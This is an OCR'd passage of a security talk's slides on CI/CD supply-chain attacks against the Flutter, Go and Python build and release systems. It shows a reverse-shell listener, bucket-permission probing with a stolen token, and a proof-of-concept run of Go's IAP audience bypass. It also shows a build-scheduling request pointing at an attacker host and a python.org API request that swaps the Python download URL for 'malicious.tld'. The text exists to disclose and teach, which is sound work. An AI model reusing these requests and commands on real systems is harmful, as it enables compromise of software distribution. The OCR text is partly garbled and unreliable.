flutter_infra_release: storage.objects.create
download.flutter.io: storage.objects.create
flutter_archives_v2: storage.objects.create
```

## Slide 100


> Recovered by OCR — confidence 84/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@@@ #2 Oriwrap ncat -Ivp 7414
uid=1000@Cchrome-bot) gid=100@Cchrome-bot) groups=1000Cchrome-bot) ,109Ckvm)
TOKEN=$CLuci-auth token -scopes https://www.googleapis.com/auth/cloud-pLlatform)
for B in flutter_infra_release download.flutter.io flutter_archives_v2; do
echo "$B: $Ccurl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/s
ge.objects.create" | grep -o 'storage.objects.create')"
done
flutter_infra_release: storage.objects.create
download.flutter.io: storage.objects.create
```

## Slide 101

Flutter Hacked 2

## Slide 102

Golang 3

## Slide 103


> Recovered by OCR — confidence 74/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CG 25 https://build.golang.org
Name [master v] CO show only first-class ports
drchase-gotip-linux-arr
drchase-gotip-linux-arr
Go
darwin
amd64 amd64 amd64 amd64 amd64 arm64 arm64 arm64 arm64 arm64 386
6db72bb jorro... 25 Jul 13:25 cmd/compile: remove... ok ok ok ok fail ok ok ok ok ok ok
af4b@2c jorro... 25 Jul 13:24 cmd/compile: donot... ok ok ok ok fail ok ok ok ok ok ok
Zb4aab8 sam... 25 Jul 03:27 internal/strconv: rem... ok ok ok ok fail ok ok ok ok ok ok
a961f70 hya... 24 Jul 21:36 cmd/go/internal/doc:.... ok ok ok ok fail ok ok ok ok ok __ ok
a3b0982 ado... 24 Jul 21:26 cmd/vet: update Test... ok ok ok ok fail ok ok ok ok ok _— ok
fOdbb9b 24 Jul 18:48 cmd: update x/toolst... ok ok ok — ok ok ok ok ok _— ok ok
```

## Slide 104

Redirect to Login ... Not in IAM list → 403

**IAP** Identity-Aware Proxy Pass Inject X-Goog-IAP-JWT-Assertion header

**gomote.golang.org build.golang.org**

## Slide 105

|<header>.**{**|
|---|
|"iss":
"https://cloud.google.com/iap",|
|"aud":
"/projects/<proj-id>/global/backendServices/<svc-id>",|
|"sub":
"accounts.google.com:<account-id>",|
|Redirect to Login ...
 "email":
"someone@google.com",|
|"hd":
"google.com",|
|**IAP**
Not in IAM list → 403
 "iat":
1145141919,|
|Identity-Aware Proxy
 "exp":
1145149453,|
|Pass
**gomote.golang.org**
 "google":
{"access_levels": [...] }|
|**build.golang.org**
**}**.<signature>|
|InjectX-Goog-IAP-JWT-Assertion
header|

## Slide 106

###### "" = IAPSkipAudienceValidation

RequireIAPAuthUnaryInterceptor(IAPSkipAudienceValidation) * * func (v Validator) validate(ctx, idToken, audience) ( Payload, err) { if audience != "" && payload.Audience != audience { return nil, fmt.Errorf( " idtoken: audience does not match " )

## Slide 107

###### "" = IAPSkipAudienceValidation

RequireIAPAuthUnaryInterceptor(IAPSkipAudienceValidation) * * func (v Validator) validate(ctx, idToken, audience) ( Payload, err) { if audience != "" && payload.Audience != audience {

return nil, fmt.Errorf( " idtoken: audience does not match " )

## Slide 108


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
go / build / 8cc3517581090ba52a473fc0602e02169929d921
commit 8cc3517581090ba52a473fc0602e02169929d921 [log] [tgz]
author Carlos Amedee <carlos@golang.org>
committer Carlos Amedee <carlos@golang.org>
Fri Jan 14 10
Sat Jan 15 00
tree 84a37675b293c344e243c08300cc322682f8792d
parent 09d18253d412a5a6c4177d5056a968953fe6269e [diff]
internal/access, cmd/coordinator: add option to
disable audience check
This change adds the option to skip the validation of the audience
field in JWT tokens. We understand that validating the JWT token is
enough to know that the packet came from a valid source.
Updates golang/go#48742
```

## Slide 109


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
go / build / 8cc3517581090ba52a473fc0602e02169929d921
commit
author
committer
tree
parent
8cc3517581090ba52a473fc0602e02169929d921 [log] [tgz]
Carlos Amedee <carlos@golang.org> Fri Jan 14 10
Carlos Amedee <carlos@golang.org> Sat Jan 15 00
09d18253d412a5a6c4177d5056a968953fe6269e [diff]
internal/access, cmd/coordinator: add option to disable audience check
This change adds the option to skip the validation of the audience
field in JWT tokens. |We understand that validating the JWT token is
enough to know that the packet came from a valid source.
Updates golang/go#48742
```

## Slide 110


> Recovered by OCR — confidence 91/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
346
347
348
349
350
351
352
353
346
347
348
349
350
351
352
353
@@ -346,8 +346,
if serviceID = env. IAPServiceID(coordinatorBackend); serviceID == "" {
log.Fatalf("unable to retrieve Service ID for backend service=%q", coordinatorBackend)
}
opts =
8 @@ func main() {
append(opts,
+2 -2 8820
opts =
opts =
grpc.UnaryInterceptor(access.RequireIAPAuthUnaryInterceptor(access.IAPSkipAudienceValidation) ) )
opts =
}
append(opts,
append(opts,
append(opts,
// grpcServer is a shared gRPC server. It is global, as it needs to be used in places that aren't factored
otherwise.
grpcServer
:= grpc.NewServer(opts...)
```

## Slide 111

- RequireIAPAuthUnaryInterceptor(access.IAPAudienceGCE(env.ProjectNumber, serviceID))
+ RequireIAPAuthUnaryInterceptor(access.IAPSkipAudienceValidation)

## Slide 112


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Go Build Coordinator Performance Das
Defined Builders
name owners
aix-ppc64 pc64-osuos! @trex58
android-386-emu host-linux-amd64-androidemu golang-dev
android-amd64-emu inux-amd64-androidemu golang-dev
android-arm-corellium host-android-arm64-corellium-android @steeve, @changkun
android-arm64-corellium host-android-arm64-corellium-android @steeve, @changkun
darwin-amd64-10_15 ho: amd6 golang-dev
darwin-amd64-11_0 host-darwin-amd64-11-aws golang-dev
darwin-amd64-12_0 host-darwin-amd64-12-aws golang-dev
darwin-amd64-13 host-dai amd64-13-aws golang-dev
darwin-amd64-longtest host-darwin-amd64-13-aws golang-dev
darwin-amd64-nocgo host-darwin-amd64-12-aws golang-dev
darwin-amd64-race ho: amd64-12-aws golang-dev
darwin-arm64-11 host-darwin-arm64-11 golang-dev
darwin-arm64-12 host-darwin-arm64-12 golang-dev
dragonfly-amd64-622 host-dragonfl golang-dev
freebsd-386-12_3 host-freebsd-amd64-12_ 3 golang-dev
freebsd-386-13_0 host-freebsd-amd64-13_0 golang-dev
freebsd-amd64-12_3 ‘eebsd-amdé: golang-dev
freebsd-amd64-13_0 freebsd-amd64-13 0 golang-dev
freebsd-amd64-race host-freebsd-amd64-13_0 golang-dev
freebsd-arm-paulzhol @paulzhol
freebsd-arm64-dmgk @dmi
freebsd-riscv64-unmatched @mengzhuo
illumos-amd64
```

## Slide 113


> Recovered by OCR — confidence 80/100 on the text kept, 74/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
eee & splitline@splitlinedeMacBook-Pro:~/golang-cicd-sec/poc/poc
+ poc IAP_JWT=$(/Users/splitline/golang-cicd-sec/make_iap_jwt.sh \
--cid 'a8ebf94c8-O1ff-457a-aed4-4add00d5f328' \
--app-url ‘https://serene-smoke-244105.uc.r.appspot.com/' \
--sa ‘iap-tester@serene-smoke-244105.1am.gserviceaccount.com' \
--project 'serene-smoke-244105' \
echo "${IAP_JWT:0:120}..."
)+ poc go run . -target gomotessh.golang.org:443 -jwt "$IAP_JWT" create gol.25-Linux-amd64
[*] Waiting (@ ahead)...
[+] Created iap-tester-gol.25-Linux-amd64-@ (Cbuilder=go1.25-linux-amd64, host=swarming task)
)+ poc go run . -target gomotessh.golang.org:443 -jwt "$IAP_JWT" -sys exec iap-tester-gol.25-Linux-amd64-@ -- bash -c "id; uname -a"
Linux golang-ciw-n1-1linux-x86-bullseye-us-centrall-b-Q-vvxv 6.1.161+ #1 SMP PREEMPT_DYNAMIC Sat Feb 7 20:26:32 UTC 2026 x86_64 GNU/Li
```

## Slide 114

Job#1
Job#2
Local Auth RPC
Job#3
… Auth Service Account
Job#1
Prod Task
LUCI_CONTEXT
Job#2
Based on  Task Type
Job#3
…
Bot
Job�Worker
Try Task

## Slide 115

Job#1
Job#2
Local Auth RPC
Job#3
Security�Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on  Task Type
Job#3
…
Public Task
Try�Bot
chromium-swarm.appspot.com

## Slide 116

Job#1
Job#2
Local Auth RPC
security-try-workers
Job#3
Security�Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on  Task Type
Job#3
ci-workers
… try-workers
Public Task
Try�Bot
chromium-swarm.appspot.com

## Slide 117

Job#1
Job#2
Local Auth RPC
security-try-workers
Job#3
Security�Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on  Task Type
Job#3
ci-workers
… try-workers
Public Task
Try�Bot
chromium-swarm.appspot.com

## Slide 118

Job#1
Job#2
Local Auth RPC
security-try-workers
Job#3
Security�Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on  Task Type
Job#3
ci-workers
… try-workers
Public Task
Try�Bot
chromium-swarm.appspot.com
Cross Bot?

## Slide 119

Job#1
Job#2
Local Auth RPC
Job#3
Security�Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on  Task Type
Job#3
ServiceAccount: "coordinator-builder@golang-ci-luci…"
…
CipdPackage:    "infra/tools/luci-auth/…"
Public Task
Try�Bot
chromium-swarm.appspot.com

## Slide 120

###### Job#1

Job#2 Local Auth RPC Job#3 Security�Bot luci.binding(… Releasing�/�Security�Patch Auth Service Account ~~roles~~ = ~~"role/buildbu~~ cket.triggerer", Job#1 users = [" coordinator-builder@ …", "security-coordinator-builder@…"], Security Task ) LUCI_CONTEXT

LUCI_CONTEXT

Job#2

Based on Task Type

Job#3

ServiceAccount: " coordinator-builder@ golang-ci-luci…" … CipdPackage:    "infra/tools/luci-auth/…" Public Task Try�Bot chromium-swarm.appspot.com

## Slide 121

curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H "Authorization: Bearer $COORDINATOR_TOKEN" \

--json '{ "builder": { "project": "golang", "bucket": "try", "builder": "go1.25-linux-amd64" }, "gerritChanges": [{

"host": "go-review.googlesource.com", "project": "go", "change": "114514", "patchset": "1" }] }'

## Slide 122

curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H "Authorization: Bearer $COORDINATOR_TOKEN" \

--json '{ "bucket": "builder": { "project": "golang", "security-try", "builder": "go1.25-linux-amd64" },

"gerritChanges": [{

"host": "splitline.tw",

"project": "go", "change": "114514", "patchset": "1" }]

}'

## Slide 123

curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H "Authorization: Bearer $COORDINATOR_TOKEN" \ --json '{ "bucket": "builder": { "project": "golang", "security-try", "builder": "go1.25-linux-amd64" }, "gerritChanges": [{ "host": "splitline.tw", "project": "go", "change": "114514", "patchset": "1" }] }'

## Slide 124

curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H "Authorization: Bearer $COORDINATOR_TOKEN" \ --json '{ "bucket": "builder": { "project": "golang", "security-try", "builder": "go1.25-linux-amd64" }, "gerritChanges": [{

"host": "splitline.tw", "project": "go", "change": "114514", "patchset": "1" }] }'

## Slide 125

Job#1
Job#2
Local Auth RPC
security-worker-builder@
Job#3
Security�Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on  Task Type
Job#3
…
Public Task
Try�Bot
chromium-swarm.appspot.com

## Slide 126

Job#1
gs://golang/
Job#2
Local Auth RPC
security-worker-builder@
Job#3
Security�Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on  Task Type
Job#3
…
Public Task
Try�Bot
chromium-swarm.appspot.com

## Slide 127

Job#1
gs://golang/
Job#2
Local Auth RPC
security-worker-builder@
Job#3
Security�Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on  Task Type
Job#3
…
Public Task
Try�Bot
chromium-swarm.appspot.com

## Slide 128

Job#1
gs://golang/
Job#2
Local Auth RPC
security-worker-builder@
Job#3
Security�Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on  Task Type
Job#3
…
RELUI
Public Task
Try�Bot REL ease� UI
chromium-swarm.appspot.com

## Slide 129

Job#1
gs://golang/
Job#2
Local Auth RPC
security-worker-builder@
Job#3
Release
Security�Bot
… chrome-swarming.appspot.com Auth Pipeline Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on relui-prod@ Task Type
Job#3
…
RELUI
Public Task
Try�Bot REL ease� UI
chromium-swarm.appspot.com

## Slide 130

Job#1
gs://golang/
Job#2
Local Auth RPC
security-worker-builder@
Job#3
Release
Security�Bot
… chrome-swarming.appspot.com Auth Pipeline Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
relui-task@ Based on relui-prod@ Task Type
Job#3
…
RELUI
Public Task
Try�Bot REL ease� UI
chromium-swarm.appspot.com

## Slide 131


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
x/build/internal/gomote: explore destroying the bot after a gomote
instance is destroyed #63819
© Open Listed in Q)#61772
i) cagedmantis opened on Oct 30, 2023
Last edited by cagedmantis ~ Contributor
When a gomote instance runs on a swarming task instead of a bare VM/Container, we should consider destroying the bot after the
gomote instance has completed running. This should be an added safeguard for unwanted artifacts being left behind on the instance.
@golang/release
©
```

## Slide 132

Job#1 Job#2 Job#3 …

RELUI REL ease� UI

Security Task Security Patch Security�Bot chrome-swarming.appspot.com

## Slide 133

**Our#1** Job#2 RELUI Job#3 REL ease� UI … security-worker-builder@ Security Task Security Patch Security�Bot chrome-swarming.appspot.com

## Slide 134

Plant Trojan!
RELUI
REL ease� UI

Our#1
Job#2
Job#3
…
security-worker-builder@
Security Task
Security Patch Security�Bot
chrome-swarming.appspot.com

## Slide 135

(do evil things) Job#1 **Job#2** RELUI Job#3 REL ease� UI … security-worker-builder@ Security Task Security Patch Security�Bot chrome-swarming.appspot.com

## Slide 136

Got You RELUI!

Job#1 **Job#2** Job#3 … relui-task@ **relui-task@** Security Task Security Patch Security�Bot chrome-swarming.appspot.com

relui-task@

RELUI
REL ease� UI

## Slide 137

Got You RELUI! **relui-task@** Job#1 **Job#2** RELUI Job#3 REL ease� UI … **relui-task@** relui-task@ Security Task Security Patch Security�Bot W ho Are You chrome-swarming.appspot.com ?

## Slide 138

### Releasing Pipeline

dl.google.com/go Pipeline gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot**

## Slide 139

### Releasing Pipeline

dl.google.com/go Pipeline gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@

## Slide 140

### Releasing Pipeline

dl.google.com/go Pipeline gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@ [ gs://golang-release-staging ]

## Slide 141

### Releasing Pipeline

dl.google.com/go Pipeline gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@ [ gs://golang-release-staging ]

## Slide 142

### Releasing Pipeline

dl.google.com/go Pipeline gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@ [ gs://golang-release-staging ]

## Slide 143

### Releasing Pipeline

dl.google.com/go gs://golang/ **Compare Sign Upload**

**Cloud Build Gerrit Compare Source Code Windows bot** relui-task@

[ gs://golang-release-staging ]

## Slide 144

Python 4

## Slide 145

## Slide 146


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
how to install python
AlMode All Videos Shortvideos Images Forums News’ More ~ Tools »
> Al Overview
To install Python, go to the Official Python Downloads Page for your OS, download the
latest stable version, and run the installer. Crucial: Ensure you check the box that says
"Add python.exe to PATH" (or "Add Python to environment variables") before clicking "Install
Now." 2
```

## Slide 147


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
how to install python
AlMode All Videos Shortvideos Images Forums News’ More ~ Tools »
> Al Overview
To install Python, go to the Official Python Downloads Page for your OS, download the
latest stable version, and run the installer. Cract u check the box that says
"Add python.exe to PATH" (or "Add Python to iables") before clicking "Install
Now." 2
```

## Slide 148


> Recovered by OCR — confidence 96/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Python
About Downloads Documentation Community Success Stories News Events
Download the latest version for macOS
Download Python 3.14.6
Looking for Python with a different OS? Python for Windows,
Linux/Unix, macOS, Android, iOS, other
Want to help test development versions of Python 3.15? Pre-releases,
Docker images
```

## Slide 149


> Recovered by OCR — confidence 94/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
25 https://www.python.org/downloads/
About Downloads Documentation Community Success Stories News Events
Download the latest version for macOS
Download Python 3.14.6
Looking for Python with a different OS? Python for Windows,
Linux/Unix, macOS, Android, iOS, other
Want to help test development versions of Python 3.15? Pre-releases,
Docker images
```

## Slide 150

WHAT?


> Recovered by OCR — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Python
About Downloads Documentation Community Success Stories News Events
Download the latest version for macOS
Download Python 3.14.6 -
Looking for Pvthon with a different OS? Pvthon for Windows,
WHAT?
```

## Slide 151

WHAT?


> Recovered by OCR — confidence 91/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Download Python 3.14.6
Looking for Pvthon with a different 04
```

## Slide 152

PATCH /api/v1/downloads/release_file/123/ ?format=json&username=ambv& api_key=ANY HTTP/1.1 Host: www.python.org Content-Type: application/json

{"url": "https://malicious.tld/python.exe"}

## Slide 153

PATCH /api/v1/downloads/release_file/123/ ?format=json&username=ambv&& api_key=ANY HTTP/1.1 Host: www.python.org Content-Type: application/json

{"url": "https://malicious.tld/python.exe"}

## Slide 154

PATCH /api/v1/downloads/release_file/123/ ?format=json&username=ambv&& api_key=ANY Host: www.python.org Content-Type: application/json

HTTP/1.1

{"url": "https://malicious.tld/python.exe"} Compromised!

## Slide 155


> Recovered by OCR — confidence 81/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Code Issues 65 Pullrequests 44 Agents Actions Projects Security and quality Insights
@ pythondotorg Public Q Sponsor @ Watch 123 ~ 8 Fork 686 y yw Star 1.6k Sa
About
P main ~ P S> Go to file + <> Code ~
Source code for python.org
® JacobCoffee update ack ui (#3066) Y d99979b - 14 hoursago © @ www.python.org
psf python
.github chore(deps): bump zizmorcore... 5 days ago
```

## Slide 156

class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key)

if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check

## Slide 157

class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check

## Slide 158

class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check Query User Checking API Key Set User (if pass)

## Slide 159

class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway

def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key)

if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check

## Slide 160

class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway

def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check

## Slide 161

class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check

## Slide 162

class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try:

lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check Query User Checking API Key Set User (if pass)

## Slide 163

class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check Query User Checking API Key Set User (if pass)

## Slide 164

class ApiKeyOrGuestAuthentication( tastypie.authentication.ApiKeyAuthentication) : def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check Query User Checking API Key Set User (if pass)

## Slide 165

class ApiKeyOrGuestAuthentication( tastypie.authentication.ApiKeyAuthentication) : def _unauthorized(self): return True # Allow guests anyway

def is_authenticated(self, request, **kwargs): User = get_user_model() class ApiKeyAuthentication(Authentication): username_field = User.USERNAME_FIELD   # … try: def _unauthorized(self) : username, api_key = self.extract _ credentials ( re q uest ) return HttpUnauthorized( ) except ValueError: def get_key(self, user, api_key): return self._unauthorized() from tastypie.models import ApiKey if not username or not api_key: return self._unauthorized() try: try: if user.api_key.key != api_key: lookup_kwargs = {username_field: username} return self._unauthorized() user = User.objects.get(**lookup_kwargs) except ApiKey.DoesNotExist: except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() return self._unauthorized() return True if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check Query User

## Slide 166

class ApiKeyOrGuestAuthentication( tastypie.authentication.ApiKeyAuthentication) : def _unauthorized(self): return True # Allow guests anyway

def is_authenticated(self, request, **kwargs): User = get_user_model() class ApiKeyAuthentication(Authentication): username_field = User.USERNAME_FIELD   # … try: ~~def _unauthorized(self) :~~ username, api_key = self.extract <u>_ credentials</u> <u>(</u> re <u>q uest</u> <u>)</u> ~~return HttpUnauthorized( )~~ except ValueError: def get_key(self, user, api_key): return self._unauthorized() from tastypie.models import ApiKey if not username or not api_key: return self._unauthorized() try: try: if user.api_key.key != api_key: lookup_kwargs = {username_field: username} return self._unauthorized() user = User.objects.get(**lookup_kwargs) except ApiKey.DoesNotExist: except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() return self._unauthorized() return True if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check Query User

## Slide 167

class ApiKeyOrGuestAuthentication( tastypie.authentication.ApiKeyAuthentication) : def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() class ApiKeyAuthentication(Authentication): username_field = User.USERNAME_FIELD   # … try: ~~def _unauthorized(self) :~~ username, api_key = self.extract <u>_ credentials</u> <u>(</u> re <u>q uest</u> <u>)</u> ~~return HttpUnauthorized( )~~ except ValueError: def get_key(self, user, api_key): return self._unauthorized() from tastypie.models import ApiKey if not username or not api_key: return self._unauthorized() try: try: if user.api_key.key != api_key: lookup_kwargs = {username_field: username} return self._unauthorized() user = User.objects.get(**lookup_kwargs) except ApiKey.DoesNotExist: except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() return self._unauthorized() return True if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check Query User

return False

## Slide 168

## Slide 169

Developer�
CI/CD�Risks ???
Dashboard
Attack Surfaces

## Slide 170

Developer�
CI/CD�Risks Home�Page
Dashboard
Attack Surfaces

## Slide 171

Hey,

## Slide 172

So, did you use any AI?

## Slide 173

So, did you use any AI? Yes, quite a few.

## Slide 174

Thanks!

splitline@devco.re @_splitline_
